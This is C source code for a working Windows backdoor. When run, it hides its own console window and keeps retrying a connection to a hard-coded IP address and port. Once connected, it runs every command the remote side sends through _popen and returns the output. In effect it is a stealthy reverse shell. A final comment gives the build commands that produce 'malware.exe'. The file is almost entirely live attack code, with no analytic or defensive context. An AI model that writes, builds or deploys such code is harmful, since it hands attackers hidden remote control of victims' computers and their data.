#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#pragma comment(lib, "wsock32.lib")
#include <winsock2.h>
#include <windows.h>
#include <winuser.h>
#include <wininet.h>
#include <windowsx.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>

#define bzero(p, size) (void)memset((p), 0, (size));

void Shell(void);

int sock;

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow)
{

	HWND stealth;
	AllocConsole();
	stealth = FindWindowA("ConsoleWindowClass", NULL);

	ShowWindow(stealth, 0);

	struct sockaddr_in ServAddr;
	unsigned short ServPort;
	char *ServerIp;
	WSADATA wsaData;

	ServerIp = "192.168.0.183";
	ServPort = 50005;

	//This initiates the winsock2 api. returns 0 if successful
	if (WSAStartup(MAKEWORD(2, 0), &wsaData) != 0)
	{
		exit(1);
	}

	//AF_INET is IVP4
	sock = socket(AF_INET, SOCK_STREAM, 0);

	memset(&ServAddr, 0, sizeof(ServAddr));
	ServAddr.sin_family = AF_INET;
	ServAddr.sin_addr.s_addr = inet_addr(ServerIp);
	ServAddr.sin_port = htons(ServPort);

start:
	while (connect(sock, (struct sockaddr *)&ServAddr, sizeof(ServAddr)) != 0)
	{
		Sleep(10);
		goto start;
	}
	Shell();
}

void Shell(void)
{
	char buffer[1024];
	char container[1024];
	char total_response[18384];

	while (1)
	{
	jump:
		bzero(buffer, 1024);
		bzero(container, sizeof(container));
		bzero(total_response, sizeof(total_response));
		recv(sock, buffer, 1024, 0);

		if (strncmp("q", buffer, 1) == 0)
		{
			close(sock);
			WSACleanup();
			exit(1);
		}
		else
		{
			FILE *fp;
			fp = _popen(buffer, "r");
			while (fgets(container, 1024, fp) != NULL)
			{
				strcat(total_response, container);
			}
			send(sock, total_response, sizeof(total_response), 0);
			fclose(fp);
		}
	}
}

//gcc prog.c -o prog -lws2_32 tp link library || install mingw-w64, cmd i686-w64-mingw32-gcc -o malware.exe backdoor.c -lwsock32 -lwininet